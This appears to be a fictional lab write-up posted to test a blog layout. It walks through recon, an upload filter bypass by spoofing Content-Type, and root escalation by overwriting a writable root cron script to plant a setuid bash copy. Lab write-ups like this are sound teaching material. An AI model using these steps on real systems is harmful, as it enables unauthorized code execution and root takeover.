---
title: "Test Write-up: RedNode"
description: "A fictional lab walkthrough covering recon, web foothold, and privilege escalation for testing the blog layout."
date: 2025-03-25T10:20:00+02:00
lastmod: 2025-03-25T10:20:00+02:00
tags:
  - test
  - walkthrough
  - web
  - privesc
categories:
  - writeup
cover: "covers/privesc-map.svg"
draft: false
---

`RedNode` is a fictional Linux lab box I wrote up to test this blog layout. The goal here is not realism at all costs. The goal is to make sure headings, code blocks, lists, quotes, and long-form notes all render cleanly on the site.

<!--more-->

## Scope

- Target: `198.51.100.23`
- Objective: gain user access, escalate to root, capture proof
- Environment: isolated practice lab

## Recon

The first pass was just about identifying exposed services and anything that looked unusual.

```bash
nmap -Pn -sCV -oA scans/rednode 198.51.100.23
```

### Results

- `22/tcp` OpenSSH 9.x
- `80/tcp` nginx
- `3000/tcp` Node.js application

Port `3000` was the most interesting part of the attack surface because it exposed a lightweight admin panel with a login form and a file upload workflow.

## Web Enumeration

I checked the application manually first and then used a content wordlist to see if there were hidden routes.

```bash
ffuf -u http://198.51.100.23:3000/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -fc 404
```

Interesting paths:

- `/login`
- `/api/profile`
- `/api/upload`
- `/uploads`

The upload endpoint accepted image files, but the server-side validation was inconsistent. The UI blocked non-image extensions, while the API only checked the `Content-Type` header.

## Initial Access

I authenticated with a low-privileged test account and replayed the upload request through a proxy. Replacing the uploaded file with a simple server-side script and keeping the `image/png` content type was enough to land code execution inside the application context.

Example request pattern:

```http
POST /api/upload HTTP/1.1
Host: 198.51.100.23:3000
Content-Type: multipart/form-data; boundary=----demo

------demo
Content-Disposition: form-data; name="file"; filename="avatar.js"
Content-Type: image/png

// demo payload
------demo--
```

Once the file was reachable from `/uploads`, triggering it gave command execution as the web user.

## Shell Upgrade

The initial shell was unstable, so I upgraded it immediately:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 40 cols 140
```

At that point the session was much easier to work with for enumeration.

## Privilege Escalation

Standard checks showed a scheduled task running a backup script from a writable directory.

```bash
sudo -l
find / -writable -type d 2>/dev/null | head
ps aux | grep backup
cat /etc/crontab
```

The useful finding was a root-owned cron job calling `/opt/backups/backup.sh`, while the directory permissions allowed the low-privileged user to modify the script.

After replacing the script contents with a harmless proof command, the cron job executed it as root on the next run.

```bash
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > /opt/backups/backup.sh
chmod +x /opt/backups/backup.sh
```

A minute later:

```bash
/tmp/rootbash -p
id
```

Output:

```text
uid=1001(app) gid=1001(app) euid=0(root) groups=1001(app)
```

## Proof

```bash
whoami
hostname
cat /root/proof.txt
```

Example output:

```text
root
rednode
9b2d-demo-proof-flag
```


